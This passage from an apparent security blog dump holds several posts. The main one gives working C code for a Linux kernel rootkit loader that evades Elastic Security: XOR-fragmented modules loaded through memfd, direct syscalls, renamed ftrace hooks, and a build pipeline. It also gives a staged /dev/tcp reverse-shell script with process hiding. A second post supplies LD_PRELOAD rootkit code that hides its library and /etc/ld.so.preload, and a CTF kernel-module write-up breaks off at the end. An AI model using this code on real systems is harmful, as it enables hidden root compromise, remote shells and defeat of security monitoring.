(strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 